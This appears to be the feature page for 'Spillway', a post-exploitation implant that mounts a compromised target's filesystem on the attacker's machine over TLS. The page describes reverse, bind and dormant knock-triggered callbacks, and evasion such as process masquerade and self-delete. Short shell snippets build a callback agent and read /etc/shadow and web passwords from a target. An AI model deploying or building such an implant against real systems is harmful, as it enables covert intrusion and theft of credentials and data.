FEATURES

Three ways in, one mount out

Reverse, bind, or dormant. Full FUSE mount. TLS 1.3 encryption. PSK authentication. Agent deployment with zero runtime args.

Reverse / Bind / Dormant

Three connection modes. Agent calls back (reverse), listens on target (bind), or sits silent with no open ports until an authenticated UDP knock triggers a callback (dormant). All modes over TLS 1.3 with mutual PSK auth.

$ ./build.sh reverse 10.10.14.5:443
[+] PSK generated: K7x2m... Mode: reverse
[+] Built bin/spillway-agent-linux-amd64
3
Connection Modes

Full FUSE Mount

Real mountpoint on your machine. ls, cat, cp, grep, find, vim — any tool that reads files works transparently against the remote filesystem. 17 operations mapped through FUSE.

$ ls ./target/etc/
crontab group hostname hosts passwd shadow ssh/
$ grep -r "password" ./target/var/www/

1.3
TLS Version

PSK Authentication

Two-round HMAC-SHA256 challenge-response. Both sides prove key possession before any filesystem operations begin. Empty PSKs rejected. Auto-generated at build time.

Agent Deployment

Zero runtime arguments — all config baked via -ldflags. Nothing in /proc/cmdline. Static binary, cross-compiled for linux/windows/darwin on amd64/arm64.

Dormant Mode

Agent sits silent with no open ports, no listeners, zero network footprint. An authenticated UDP knock triggers a reverse callback. Ideal for persistence on hardened targets.

File Operations

17 filesystem operations: stat, readdir, read, write, create, mkdir, remove, rename, chmod, truncate, xattr, chown, symlink, link, statfs. Full read-write or read-only mode.

ARCHITECTURE

Four-layer design

Agent on target, listener on attacker, TLS 1.3 transport, FUSE integration. All config baked at compile time.

1

Agent

Target-side binary. 17 filesystem operation handlers with path jailing and symlink resolution. 64-goroutine worker pool via ServerMux. Process masquerade, core dump prevention, self-delete.

2

Listener

Attacker-side binary. Accepts connections, creates sessions with TTL cache. ClientMux multiplexes FUSE calls over single TLS connection. FUSE mount presents remote filesystem locally.

3

Transport

TLS 1.3 with ephemeral ECDSA certs and optional fingerprint pinning. Length-prefixed framing with 16 MiB cap. Mutual HMAC-SHA256 PSK authentication. HTTP CONNECT proxy support.

4

FUSE Layer

Translates kernel FUSE calls to network requests. bazil.org/fuse integration. Directory and file nodes map to remote operations. TTL caching reduces round trips.

DETECTION AWARENESS

Know the boundaries

Hidden From

  • ps aux — process masquerade shows false name
  • /proc/cmdline — zero arguments, nothing to inspect
  • File inspection — self-delete removes binary post-execution
  • Passive traffic — TLS 1.3 encrypts all filesystem operations
  • Dormant mode — zero network footprint until authenticated knock

Visible To

  • strace, eBPF — syscall tracing reveals behavior
  • Network monitoring — connection patterns remain observable
  • EDR / XDR — behavioral analysis may detect anomalies
  • FUSE mount in /proc/mounts — mount visible to kernel
  • Memory forensics — keys and buffers recoverable from RAM
